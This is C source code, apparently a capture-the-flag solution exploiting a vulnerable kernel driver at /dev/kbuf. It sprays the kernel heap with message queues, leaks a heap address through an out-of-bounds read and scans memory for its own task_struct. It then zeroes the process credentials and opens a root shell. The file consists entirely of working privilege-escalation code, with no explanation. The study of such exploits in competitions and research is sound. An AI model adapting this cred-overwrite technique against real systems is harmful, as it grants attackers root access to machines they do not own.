#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/stat.h>
#include <sys/msg.h>
#include <unistd.h>

static void fatal(const char *msg) {
    perror(msg);
    exit(1);
}

#define SIZE (0x800 - 0x30)

struct msg_buf{
  long mtype;
  char mtext[SIZE];
};

int main(void) {
    // heap spray
    // ref: https://manpages.ubuntu.com/manpages/focal/man2/msgrcv.2.html
    struct msg_buf m;
    for (int i = 0; i < 0x80; i++) {
        int qid = msgget(i, IPC_CREAT | 0666);
        m.mtype = 1;
        strcpy(m.mtext, "private_data");
        for (int j = 0; j < 2; j++) {
            if (msgsnd(qid, (void *) &m, SIZE, IPC_NOWAIT) == -1) {
                fatal("msgsnd error");
            }
        }
    }

    int fd = open("/dev/kbuf", O_RDWR);
    if(fd < 0) {
        fatal("/dev/kbuf");
    }

    for (int i = 0x80; i < 0x100; i++) {
        int qid = msgget(i, IPC_CREAT | 0666);
        m.mtype = 1;
        strcpy(m.mtext, "private_data");
        for (int j = 0; j < 2; j++) {
            if (msgsnd(qid, (void *) &m, SIZE, IPC_NOWAIT) == -1) {
                fatal("msgsnd error");
            }
        }
    }

    // rename current process
    if (prctl(PR_SET_NAME, "ctf4b2024kbuf") != 0)
        fatal("prctl");
    
    // heap address leak
    lseek(fd, 0x800, SEEK_SET);
    char buf1[0x10];
    char *p = buf1;

    read(fd, buf1, 0x10);
    unsigned long addr_private_data = *(unsigned long *)p - 0x1000; 
    printf("[+] addr_private_data = %#lx\n", addr_private_data);
    
    // find task struct
    unsigned long addr;
    size_t stride = 0x1000;
    char *needle, *buf2 = malloc(stride);
    if (!buf2) fatal("malloc(stride)");

    for (addr = addr_private_data - 0x200000; ; addr += stride) {
        printf("[*] searching 0x%016lx...\n", addr);
        
        lseek(fd, (addr - addr_private_data), SEEK_SET);
        read(fd, buf2, stride);

        if (needle = memmem(buf2, stride, "ctf4b2024kbuf", 14)) {
            addr += (needle - buf2);
            printf("[+] found comm: 0x%016lx\n", addr);
            break;
        }
    }

    unsigned long addr_cred;
    lseek(fd, ((addr - 8) - addr_private_data), SEEK_SET);
    read(fd, &addr_cred, 8);
    printf("[+] cred: %#016lx\n", addr_cred);

    // overwrite struct cred
    char zero[0x20] = { 0 };
    lseek(fd, ((addr_cred + 4) - addr_private_data), SEEK_SET);
    write(fd, zero, sizeof(zero));

    puts("[+] win!");
    system("/bin/sh");

    return 0;
}